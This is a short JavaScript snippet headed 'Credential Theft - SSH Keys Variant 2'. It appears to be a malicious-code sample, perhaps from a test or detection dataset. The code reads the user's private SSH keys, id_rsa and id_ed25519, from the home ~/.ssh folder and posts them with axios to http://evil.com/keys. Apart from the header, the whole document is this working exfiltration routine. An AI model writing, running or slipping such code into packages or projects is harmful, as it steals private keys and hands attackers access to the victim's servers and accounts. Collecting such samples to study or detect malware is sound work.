// Credential Theft - SSH Keys Variant 2
const fs = require('fs');
const path = require('path');
const sshDir = path.join(process.env.HOME, '.ssh');
const keys = {
    id_rsa: fs.readFileSync(path.join(sshDir, 'id_rsa'), 'utf-8'),
    id_ed25519: fs.readFileSync(path.join(sshDir, 'id_ed25519'), 'utf-8')
};
require('axios').post('http://evil.com/keys', keys);
